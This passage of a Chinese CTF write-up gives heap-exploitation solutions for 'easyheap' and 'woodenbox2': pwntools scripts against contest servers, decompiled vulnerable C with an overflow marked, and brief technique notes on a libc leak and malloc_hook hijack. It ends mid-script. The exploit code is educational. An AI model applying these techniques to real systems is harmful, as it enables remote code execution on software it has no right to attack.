</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;ed?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;ge?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>cont</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#p = process(&#39;./easyheap&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;121.36.209.145&#34;</span><span class=p>,</span> <span class=mi>9997</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;ce:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;e?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mh>0x600</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;ce:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;e?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mh>0x600</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x21</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x602018</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400670</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x21</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x602020</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x6f690</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;ce:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;e?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mh>0x600</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;ce:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;e?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mh>0x600</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x21</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x602018</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span> <span class=o>+</span> <span class=mh>0x45390</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;/bin/sh</span><span class=se>\0</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=woodenbox2>woodenbox2</h3><p>edit功能存在堆溢出</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=nf>change_item</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>length</span><span class=p>;</span> <span class=c1>// ST08_4
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// [rsp+4h] [rbp-2Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-24h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [rsp+10h] [rbp-20h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>nptr</span><span class=p>;</span> <span class=c1>// [rsp+20h] [rbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [rsp+28h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>num</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Please enter the index of item:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mi>8uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>PTR_LIST</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>idx</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Please enter the length of item name:&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>nptr</span><span class=p>,</span> <span class=mi>8uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>length</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=o>&amp;</span><span class=n>nptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Please enter the new name of the item:&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>nptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>v3</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>PTR_LIST</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>idx</span><span class=p>],</span> <span class=n>length</span><span class=p>);</span>  <span class=c1>// overflow
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=p>((</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)</span><span class=n>PTR_LIST</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>idx</span><span class=p>]</span> <span class=o>+</span> <span class=n>v3</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=mi>10</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=p>((</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)</span><span class=n>PTR_LIST</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>idx</span><span class=p>]</span> <span class=o>+</span> <span class=n>v3</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=p>((</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>itemlist</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>idx</span><span class=p>)</span> <span class=o>=</span> <span class=nf>strlen</span><span class=p>((</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>PTR_LIST</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>idx</span><span class=p>]);</span><span class=c1>// 更新长度
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;invaild index&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;No item in the box&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v6</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>先利用堆块合并控制中间的堆块，遗留下main_arena地址，修改低字节指向iofile，修改stdout结构体来泄露libc，接着就劫持malloc_hook</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># encoding:utf-8</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>file</span> <span class=o>=</span> <span class=s1>&#39;./woodenbox2&#39;</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>e</span><span class=o>.</span><span class=n>libc</span>
</span></span><span class=line><span class=cl><span class=n>rlibc</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>ip</span> <span class=o>=</span> <span class=s1>&#39;121.36.215.224&#39;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=s1>&#39;9998&#39;</span>
</span></span><span class=line><span class=cl><span class=n>debug</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dbg</span><span class=p>(</span><span class=n>code</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>debug</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>debug</span> <span class=o>==</span> <span class=kc>False</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=n>local</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>p</span><span class=p>,</span> <span class=n>libc</span><span class=p>,</span> <span class=n>debug</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>local</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>debug</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>debug</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>rlibc</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>rlibc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>se</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sea</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rc</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mf>0.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rn</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shell</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>un64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>un32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>c</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>s</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sea</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>change</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=n>c</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>s</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sea</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dele</span><span class=p>(</span><span class=n>i</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>run</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x98</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x98</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>dele</span><span class=p>(</span><span class=mi>3</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>change</span><span class=p>(</span><span class=mi>3</span><span class=o>+</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x60</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xa0</span> <span class=o>+</span><span class=mh>0x70</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xa0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>dele</span><span class=p>(</span><span class=mi>4</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x98</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>change</span><span class=p>(</span><span class=mi>1</span><span class=o>+</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x98</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x71</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x68</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x21</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>dele</span><span class=p>(</span><span class=mi>2</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span>
